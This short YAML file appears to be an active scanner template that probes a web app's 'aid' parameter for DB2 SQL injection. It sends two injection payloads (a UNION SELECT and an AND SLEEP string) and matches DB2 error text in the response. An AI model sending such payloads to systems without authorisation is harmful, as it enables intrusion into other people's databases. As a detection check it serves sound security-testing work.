id: sqli6-db2-12
name: 'SQLi db2 probe in aid'
severity: high
type: active
tags:
  - sqli
  - injection
  - db2
description: 'Triggers db2 error via aid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      aid:
        - ''' UNION SELECT NULL,NULL--'
        - ''' AND SLEEP(0)--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQLCODE'
          - 'DB2'
